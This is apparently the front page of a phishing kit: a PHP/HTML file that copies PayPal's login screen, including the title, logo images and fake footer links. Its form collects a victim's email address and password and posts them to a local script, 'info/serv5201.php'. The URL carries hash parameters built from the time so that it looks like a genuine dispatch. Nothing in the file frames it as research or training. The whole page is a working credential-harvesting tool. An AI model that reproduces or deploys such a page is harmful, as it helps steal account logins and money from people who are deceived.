<?php  
ob_start();
session_start();
?>
<!DOCTYPE html>
<html dir="ltr">
    <head>
        <title>Log in to your PayPal account</title>
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
        <meta charset="utf8">
        <link rel="stylesheet" href="css/normalize.css" />
        <link rel="stylesheet" href="css/bootstrap.min.css" />
        <link rel="stylesheet" href="css/font-awesome.min.css" />
        <link rel="stylesheet" href="css/login.css" />
        <link rel="shortcut icon" type="image/x-icon" href="img/ppl.ico">
    </head>
    <body>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <div class="contain">
            <form class="log-f" method="POST" action="<?php echo 'info/serv5201.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" id="logform">
                <center>
                    <img src="img/ppt.PNG">
                </center>
                <input type="email" name="mail" class="in-form" placeholder="Email" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <input type="password" name="pass" class="in-form" placeholder="Password" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <br>
                <button class="login-btn">Log In</button>
                <a href="#" class="problem">Having trouble logging in?</a>
                <hr class="hr or">
                <a href="#" class="login-btn sin-up" id="btn-submit">Sign Up</a>
            </form>
        </div>
        <div class="foot-pay">
            <center>
                <a href="#">Contact Us</a>
                <a href="#">Privacy</a>
                <a href="#">Legal</a>
                <a href="#">Worldwide</a>                
            </center>            
        </div>
        <script src="js/jquery-1.11.3.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/plugins.js"></script>
    </body>
</html>